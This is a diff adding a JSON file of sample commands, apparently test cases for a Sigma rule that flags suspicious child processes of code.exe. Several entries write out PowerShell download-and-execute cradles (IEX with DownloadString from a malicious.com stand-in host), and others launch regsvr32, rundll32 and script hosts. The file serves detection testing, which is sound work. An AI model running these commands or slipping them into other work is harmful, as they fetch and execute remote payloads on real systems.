@@ -1,0 +1,42 @@
+[
+  {
+    "output": "code.exe --wait . && calc.exe",
+    "explanation": "This command spawns calc.exe as a child process of code.exe, which matches the Sigma rule's detection criteria for suspicious child processes."
+  },
+  {
+    "output": "code.exe && regsvr32.exe /s somefile.dll",
+    "explanation": "This command spawns regsvr32.exe as a child process of code.exe, which is flagged by the Sigma rule as a suspicious child process."
+  },
+  {
+    "output": "code.exe && powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
+    "explanation": "This command spawns powershell.exe with a suspicious command line involving 'Invoke-Expression' and 'DownloadString', matching the Sigma rule's criteria."
+  },
+  {
+    "output": "code.exe && cmd.exe /c rundll32.exe somefile.dll",
+    "explanation": "This command spawns cmd.exe with rundll32.exe as a child process of code.exe, which is flagged by the Sigma rule."
+  },
+  {
+    "output": "code.exe && wscript.exe somefile.vbs",
+    "explanation": "This command spawns wscript.exe as a child process of code.exe, which is flagged by the Sigma rule as a suspicious child process."
+  },
+  {
+    "output": "code.exe && cscript.exe somefile.vbs",
+    "explanation": "This command spawns cscript.exe as a child process of code.exe, which is flagged by the Sigma rule as a suspicious child process."
+  },
+  {
+    "output": "code.exe && powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
+    "explanation": "This command spawns powershell.exe with a suspicious command line involving 'IEX' and 'DownloadString', matching the Sigma rule's criteria."
+  },
+  {
+    "output": "code.exe && powershell.exe -Command \"Invoke-Command -ScriptBlock { DownloadString('http://malicious.com/payload.ps1') }\"",
+    "explanation": "This command spawns powershell.exe with a suspicious command line involving 'Invoke-Command' and 'DownloadString', matching the Sigma rule's criteria."
+  },
+  {
+    "output": "code.exe && powershell.exe -Command \"DownloadString('http://malicious.com/payload.ps1') | IEX\"",
+    "explanation": "This command spawns powershell.exe with a suspicious command line involving 'DownloadString' and 'IEX', matching the Sigma rule's criteria."
+  },
+  {
+    "output": "code.exe && powershell.exe -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
+    "explanation": "This command spawns powershell.exe with a suspicious command line involving 'Invoke-Expression' and 'DownloadString', matching the Sigma rule's criteria."
+  }
+]
